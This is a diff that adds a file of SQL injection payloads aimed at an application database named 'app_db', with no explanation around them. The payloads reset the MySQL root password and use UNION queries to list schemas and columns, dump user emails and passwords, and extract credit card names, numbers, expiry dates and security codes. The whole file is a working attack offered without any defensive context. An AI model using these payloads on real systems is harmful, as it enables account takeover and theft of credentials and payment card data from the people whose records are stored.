@@ -1,0 +1,18 @@
+
+
+'; SET PASSWORD FOR root=PASSWORD("toor");--
+
+'union all SELECT 1,user(),DATABASE(),"",;--
+
+' UNION SELECT id,email,password,"","" FROM user; --';
+
+' UNION SELECT table_schema, table_name, 1,"",""
+    FROM information_schema.tables WHERE table_schema="app_db";--
+
+' UNION SELECT CONCAT_WS(" - ",column_name, data_type) as "export",table_name,1,1,1
+    FROM information_schema.columns WHERE table_name="user" AND table_schema="app_db";--
+
+' UNION SELECT CONCAT_WS(" - ",column_name, data_type) as "export",table_name,1,1,1 FROM information_schema.columns WHERE table_name="credit_card_infos";--
+
+'UNION SELECT CONCAT_WS(" - ",name,numbers,expiration, type, code) as export,"","","","" FROM `credit_card_infos` WHERE 1;--
+
